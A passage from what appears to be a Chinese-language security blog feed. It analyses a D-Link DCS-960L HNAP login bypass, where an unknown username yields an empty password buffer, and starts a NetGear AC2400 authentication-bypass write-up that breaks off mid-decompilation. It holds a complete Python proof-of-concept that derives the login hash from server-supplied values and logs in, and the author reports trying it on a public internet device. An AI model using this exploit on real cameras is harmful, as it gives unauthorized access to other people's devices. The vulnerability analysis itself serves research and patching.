&amp;maybe_username_list;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *v7;</span><br><span class="line">    v7 += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      n = a3;</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(v8, username);</span><br><span class="line">      a3 = n;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++index;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( index == <span class="number">21</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(buffer, *(&amp;maybe_password_list + <span class="number">3</span> * index + <span class="number">2</span>), n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ†åˆ«ä¼ å…¥ username å’Œä¸€ä¸ª bufferï¼Œè¯¥å‡½æ•°ä¼šåœ¨ç”¨æˆ·ååˆ—è¡¨ä¸­å°è¯•åŒ¹é…ç»™å®šçš„ç”¨æˆ·åï¼Œå½“æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼Œå†æŠŠå®ƒçš„å¯†ç æ‹·è´åˆ° buffer ä¸­ã€‚</p>
<p>è·å–åˆ°ç”¨æˆ·çš„å¯†ç ä¹‹åï¼Œè¿›å…¥å¯†ç éªŒè¯ç¯èŠ‚ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ä¸€ä¸ªç‰¹å®šçš„è¯·æ±‚ä»æœåŠ¡ç«¯è·å– 3 ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ cookieã€challenge å’Œ public keyã€‚è·å–åˆ°è¿™ä¸‰ä¸ªå‚æ•°åï¼Œç”¨æˆ·éœ€è¦åœ¨æœ¬åœ°æ‰§è¡Œä»¥ä¸‹è¿ç®—</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. æ‹¼æ¥ public key å’Œ passwordï¼Œå¾—åˆ° key1</span><br><span class="line">2. ç”¨ challenge å’Œ key1 æ‰§è¡Œè¿ç®— hmac_md5(challenge, challenge_len, key, key_len)ï¼Œå³ç”¨ key1 åŠ å¯†(å®é™…ä¸Šæ˜¯å“ˆå¸Œ) challengeï¼Œå¾—åˆ° private key</span><br><span class="line">3. ç”¨ private key å’Œ challenge æ‰§è¡Œè¿ç®— hmac_md5(challenge, challenge_len, private_key, private_key_len)ï¼Œå³ç”¨ private key åŠ å¯†(å®é™…ä¸Šæ˜¯å“ˆå¸Œ) challengeï¼Œå¾—åˆ°å¯†æ–‡ login_password</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° login_password å°†å®ƒå’Œç”¨æˆ·åå°è£…åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼Œå‘é€åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ‰§è¡Œç›¸åŒçš„è®¡ç®—(æœåŠ¡ç«¯æ‹¥æœ‰æ­£ç¡®çš„ password)ï¼Œå¾—åˆ°æ­£ç¡®çš„ login_passwordï¼Œç„¶åç”¨ strcmp å’Œç”¨æˆ·ä¼ å…¥çš„ login_password æ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™ç™»å½•æˆåŠŸï¼ŒæœåŠ¡ç«¯å°†æœ¬æ¬¡è¯·æ±‚çš„ cookie å†™å…¥å†…å­˜ï¼Œè§†ä¸ºç™»å½•å‡­æ®ã€‚</p>
<p>é€šè¿‡ä¸Šè¿°ç®—æ³•å¯ä»¥å‘ç°ï¼Œå¦‚æœç”¨æˆ·æ‹¥æœ‰åˆæ³•çš„ passwordï¼Œå°±èƒ½å¾—åˆ°æ­£ç¡®çš„ login_paswordï¼Œå› ä¸º challengeã€public key å¯é€šè¿‡è¯·æ±‚æœåŠ¡ç«¯å¾—åˆ°ã€‚å¦‚æœæƒ³è¦æ”»å‡»çš„è¯åªèƒ½é€šè¿‡çˆ†ç ´ password å°è¯•ç™»å½•ã€‚</p>
<p>ä½†æ˜¯æœåŠ¡ç«¯åœ¨å¤„ç† password æ—¶å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°å®ƒé¦–å…ˆé€šè¿‡ usrGetPass å‡½æ•°æ¥è·å–ä¼ å…¥çš„ç”¨æˆ·åå¯¹åº”çš„å¯†ç ï¼Œä»”ç»†è§‚å¯Ÿæ­¤å‡½æ•°çš„å®ç°ï¼Œç”¨æˆ·ååˆ—è¡¨é•¿åº¦æ˜¯æœ‰é™çš„(21)ï¼Œå¦‚æœå¤–éƒ¨ä¼ é€’ä¸€ä¸ªåœ¨ç”¨æˆ·ååˆ—è¡¨ä¸­ä¸å­˜åœ¨å€¼ï¼Œä½¿ index é€’å¢åˆ° 21ï¼Œæ­¤å‡½æ•°ä¼šè¿”å› -1ï¼Œå¹¶ä¸”ä¸ä¼šå‘ buffer æ‹·è´å†…å®¹ï¼Œå¦å¤– Login å‡½æ•°è°ƒç”¨ usrGetPass ä¹Ÿæ²¡æœ‰æ£€æŸ¥è¿”å›å€¼ã€‚</p>
<p>å½“ä¸€ä¸ªæ”»å‡»è€…å‘æœåŠ¡ç«¯æä¾›æŸä¸å­˜åœ¨çš„ç”¨æˆ·åï¼ŒusrGetPass è¿”å› -1ï¼Œå¹¶ä¸”æœ¬æ¥åº”è¯¥å­˜æ”¾ password çš„ buffer æ­¤æ—¶ä¸ºç©º(å…¨éƒ¨ä¸º \x00)ï¼Œé‚£ä¹ˆæ”»å‡»è€…åªéœ€è¦å¾—åˆ° challenge å’Œ public keyï¼Œç„¶åæŒ‰ç…§ä¸Šè¿°ç®—æ³•æ‰§è¡Œè®¡ç®—å³å¯å¾—åˆ° login passwordã€‚</p>
<p><strong>è°ƒè¯•éªŒè¯</strong></p>
<p>Login å‡½æ•°çš„åç¼–è¯‘ç»“æœå­˜åœ¨ä¸€äº›å°é—®é¢˜ï¼Œé™æ€åˆ†æå¯èƒ½æ²¡æ³•å†™å‡ºå¯ç”¨çš„ POCï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚</p>
<p>hnap_service æ˜¯ä¸€ä¸ª cgi ç¨‹åºï¼Œä¸æ¶‰åŠç›‘å¬ç«¯å£ç­‰å¤æ‚æ“ä½œï¼Œå¯ä»¥ç›´æ¥ç”¨ qemu æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå¯åŠ¨å‘½ä»¤å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mips-static -g 12345 -E REQUEST_METHOD=POST,SOAP_ACTION=http://purenetworks.com/HNAP1/Login,CONTENT_LENGTH=432,COOKIE=aaaaaaaaaa -L . ./web/cgi-bin/hnap/hnap_service</span><br></pre></td></tr></table></figure></div>

<p>-g è¡¨ç¤ºç­‰å¾… gdb é™„åŠ ï¼Œ-E æŒ‡å®šå‡ ä¸ªå¿…è¦çš„ç¯å¢ƒå˜é‡ã€‚è¿è¡Œä¹‹åå¯ä»¥ç”¨ IDA é™„åŠ ï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™è¦æ³¨æ„æŸäº›å‡½æ•°å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œä¾‹å¦‚ usrGetPassï¼ŒIReadBin ç­‰ï¼ŒåŸå› æ˜¯è¿™äº›å‡½æ•°è®¿é—®äº†æŸå…±äº«å†…å­˜ï¼Œè¿™å—å†…å­˜æ­£å¸¸åº”è¯¥ä¿å­˜ç€ä¸€äº›ç”¨æˆ·ä¿¡æ¯ã€challengeã€public key ç­‰æ•°æ®ï¼Œä½†ç”±äºæˆ‘ä»¬æ˜¯å•æ–‡ä»¶æ¨¡æ‹Ÿï¼Œæ‰€ä»¥å®ƒä»¬æ²¡æ³•æ­£å¸¸æ‰§è¡Œï¼Œé‡åˆ°è¿™ç±»å‡½æ•°è¦æ‰‹åŠ¨è·³è¿‡ã€‚</p>
<p>æŒ‡å‘ä¸Šè¿°å‘½ä»¤ï¼ŒIDA é™„åŠ ä¹‹åï¼Œåœ¨ main å‡½æ•°å¼€å¤´ä¸‹æ–­ç‚¹å¹¶æ‰§è¡Œåˆ°è¿™é‡Œï¼Œç„¶åå›åˆ°ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å†…å®¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;catalpa&lt;/Username&gt;&lt;LoginPassword&gt;CC42B96E000000000000000000000000&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>æ­£å¸¸æ‰§è¡Œï¼Œç›´åˆ°è¿›å…¥ Login å‡½æ•°ï¼Œåœ¨è¿™é‡Œå°±å¯ä»¥å¼€å§‹è°ƒè¯•åˆ†æäº†ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼ŒæŸäº›ä¼šå¯¼è‡´ç¨‹åºå´©æºƒçš„å‡½æ•°æ‰‹åŠ¨è·³è¿‡ï¼Œchallengeã€public key ç­‰æ•°æ®é€šè¿‡ä¿®æ”¹å†…å­˜çš„æ–¹å¼æ‰‹åŠ¨å†™å…¥ï¼Œå½“æ‰§è¡Œå®Œç¬¬äºŒæ¬¡ hmac_md5 ä¹‹åå°±å¯ä»¥åœ¨å†…å­˜ä¸­çœ‹åˆ°æ­£ç¡®çš„ passwordï¼Œä»¥æŸå…¬ç½‘è®¾å¤‡çš„æ•°æ®ä¸ºä¾‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-3.png"
                     
                ></p>
<p>æŒ‰ç…§ä¸Šè¿°æ€è·¯ç¼–å†™ POC å¦‚ä¸‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://xx.xx.xx.xx/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    burp0_url = URL + <span class="string">&quot;HNAP1/&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;SOAPAction&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/Login\&quot;&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:&quot;</span> +  \</span><br><span class="line">                 <span class="string">&quot;soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=\&quot;http://purenetworks.com/HNAP1/\&quot;&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;CataLpa&lt;/Username&gt;&quot;</span>       +  \</span><br><span class="line">                 <span class="string">&quot;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line">    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    challenge = res.content[<span class="number">312</span>:<span class="number">332</span>]</span><br><span class="line">    cookie = res.content[<span class="number">352</span>:<span class="number">362</span>]</span><br><span class="line">    public_key = res.content[<span class="number">382</span>:<span class="number">402</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] challenge: &quot;</span> + challenge)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] cookie: &quot;</span> + cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] public key: &quot;</span> + public_key)</span><br><span class="line">    <span class="keyword">return</span> challenge, cookie, public_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params">challenge, public_key</span>):</span><br><span class="line">    enc1 = hmac.new(public_key, challenge).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] private key: &quot;</span> + enc1.upper())</span><br><span class="line">    enc2 = hmac.new(enc1.upper(), challenge).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] password: &quot;</span> + enc2.upper())</span><br><span class="line">    <span class="keyword">return</span> enc2.upper()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">cookie, password</span>):</span><br><span class="line">    burp0_url = URL + <span class="string">&quot;HNAP1/&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;SOAPAction&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/Login\&quot;&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;uid=&quot;</span> + cookie + <span class="string">&quot;;&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:&quot;</span> +  \</span><br><span class="line">                 <span class="string">&quot;soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=\&quot;http://purenetworks.com/HNAP1/\&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;CataLpa&lt;/Username&gt;&quot;</span>       +  \</span><br><span class="line">                 <span class="string">&quot;&lt;LoginPassword&gt;&quot;</span> + password + <span class="string">&quot;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line">    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">challenge, cookie, public_key =  get_info()</span><br><span class="line">password = get_password(challenge, public_key)</span><br><span class="line">login(cookie, password)</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æŸå…¬ç½‘è®¾å¤‡æµ‹è¯•å¾—åˆ°ç»“æœï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-4.png"
                     
                ></p>
<p>æˆåŠŸåˆ©ç”¨äº†æ­¤æ¼æ´ç»•è¿‡ç™»å½•é€»è¾‘ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>NetGear AC2400 æ¼æ´å¤ç°</title>
    <url>/2021/01/13/AC2400_vuln/</url>
    <content><![CDATA[<p>èº«ä»½éªŒè¯ç»•è¿‡ä»¥åŠå‘½ä»¤æ³¨å…¥</p>
<span id="more"></span>

<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>å®˜æ–¹å‘å¸ƒä¿¡æ¯ï¼š<a class="link"   href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers" >https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æŠ«éœ²ä¿¡æ¯ï¼š<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1451/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1451/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>æ¼æ´è¯„åˆ†ï¼š8.8(<strong>High</strong>)</p>
<p>æ¼æ´æè¿°ï¼šNetGear éƒ¨åˆ†è·¯ç”±å™¨å­˜åœ¨ç™»å½•éªŒè¯ç»•è¿‡æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ç»•è¿‡æ­£å¸¸çš„ç™»å½•é€»è¾‘ç›´æ¥è®¿é—®åå°æ¥å£ï¼Œå¯ä»¥ç»“åˆå…¶ä»–æ¼æ´å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œå»ç½‘ä»¶å®˜ç½‘ä¸‹è½½åˆ°å­˜åœ¨æ¼æ´çš„å›ºä»¶ï¼š<a class="link"   href="https://www.netgear.com/support/" >https://www.netgear.com/support/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI æŠ«éœ²ä¿¡æ¯æŒ‡å‡ºæ¼æ´å½±å“å¤šä¸ªå‹å·çš„è®¾å¤‡ï¼Œæˆ‘ä»¬ä»¥ AC2400 ä¸ºä¾‹åˆ†æã€‚</p>
<p>ä¸‹è½½ 1.2.0.74 å’Œ 1.2.0.76 ä¸¤ä¸ªç‰ˆæœ¬å›ºä»¶ï¼Œåˆ†æå…¬å¼€æ¼æ´ä¸€ä¸ªæ¯”è¾ƒå®ç”¨çš„æ–¹æ³•å°±æ˜¯è¿›è¡Œç‰ˆæœ¬æ¯”è¾ƒï¼Œå¸¸ç”¨å·¥å…·åŒ…æ‹¬ Ghidraã€Bindiffã€diaphora ç­‰ã€‚(PSï¼šIDA 7.5 æ”¯æŒ MIPS åç¼–è¯‘å•¦ï¼Œå¯ä»¥ä½¿ç”¨ Bindiff 6)</p>
<p>é¦–å…ˆå¯¹å›ºä»¶è§£åŒ…ï¼Œå›ºä»¶æ²¡æœ‰ç»è¿‡ç‰¹æ®Šå¤„ç†ï¼Œç›´æ¥ binwalk ä¸€ä¸‹å³å¯ã€‚è§£å¼€å¾—åˆ°ä¸€ä¸ª Linux æ–‡ä»¶ç³»ç»Ÿï¼ŒæŒ‰ç…§æŠ«éœ²ä¿¡æ¯æ‰¾åˆ° &#x2F;usr&#x2F;sbin&#x2F;mini_httpd äºŒè¿›åˆ¶ç¨‹åºï¼ŒåŠ è½½åˆ° IDAã€‚</p>
<p>Shift+F12 æœç´¢å­—ç¬¦ä¸²ï¼Œæ¼æ´ä½äºå¤„ç†ç”¨æˆ·è¯·æ±‚çš„ä½ç½®ï¼Œæ‰€ä»¥ç›´æ¥æœç´¢ Content-Length æˆ–è€…å…¶ä»–è¯·æ±‚å¤´ä¸­ä¼šå‡ºç°çš„å­—ç¬¦ä¸²ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨å¯ä»¥å®šä½åˆ°å‡½æ•° 0x40A540 (1.2.0.74)ï¼Œå…¶ä¸­å­˜åœ¨ä»¥ä¸‹ä»£ç ç‰‡æ®µ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(v4, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1634</span>);</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v4);</span><br><span class="line">fclose(v4);</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çŒœæµ‹è¿™ä¸ªå‡½æ•°å«åš handle_requestï¼Œä¸»è¦ç”¨äºå¤„ç† HTTP è¯·æ±‚ã€‚</p>
<p>æ‘˜å½•ä¸¤ä¸ªç‰ˆæœ¬çš„ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.2.0.74</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">// çœç•¥å˜é‡å®šä¹‰éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(maybe_allow_uris, off_427030, <span class="keyword">sizeof</span>(maybe_allow_uris));</span><br><span class="line">  signal(<span class="number">14</span>, sub_407B68);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  dword_42972C = <span class="number">0</span>;</span><br><span class="line">  dword_429730 = <span class="number">0</span>;</span><br><span class="line">  path = <span class="number">0</span>;</span><br><span class="line">  dword_429734 = <span class="number">0</span>;</span><br><span class="line">  dword_42974C = <span class="number">-1</span>;</span><br><span class="line">  dword_429738 = <span class="number">0</span>;</span><br><span class="line">  dword_42973C = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429744 = <span class="number">0</span>;</span><br><span class="line">  dword_429748 = <span class="number">-1</span>;</span><br><span class="line">  host = <span class="number">0</span>;</span><br><span class="line">  v0 = <span class="number">4390912</span>;</span><br><span class="line">  ::haystack = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429768 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42976C = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429750 = <span class="number">0</span>;</span><br><span class="line">  authorization = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">4390912</span>;</span><br><span class="line">  dword_429758 = <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="number">4390912</span>;</span><br><span class="line">  dword_429760 = <span class="number">-1</span>;</span><br><span class="line">  dword_429740 = <span class="number">0</span>;</span><br><span class="line">  dword_429754 = <span class="number">0</span>;</span><br><span class="line">  dword_42975C = <span class="number">0</span>;</span><br><span class="line">  login_or_not = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v170 = <span class="number">1</span>;</span><br><span class="line">    setsockopt(fd, <span class="number">6</span>, <span class="number">3</span>, &amp;v170, <span class="number">4u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_429770 = SSL_new(dword_428718, v0, v1, v2);</span><br><span class="line">    SSL_set_fd(dword_429770, fd);</span><br><span class="line">    <span class="keyword">if</span> ( !SSL_accept(dword_429770) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_429774 = <span class="number">0</span>;</span><br><span class="line">  dword_429778 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_406E2C(v178, <span class="number">9999</span>, v1, v2);</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(v4, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1634</span>);</span><br><span class="line">          <span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v4);</span><br><span class="line">          fclose(v4);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v5 = *_errno_location();</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">4</span> &amp;&amp; v5 != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">        v6 = access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        v7 = <span class="number">4259840</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1639</span>);</span><br><span class="line">            v9 = <span class="string">&quot;break on nothing read\n&quot;</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="built_in">fputs</span>(v9, v8);</span><br><span class="line">            fclose(v8);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v10, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span 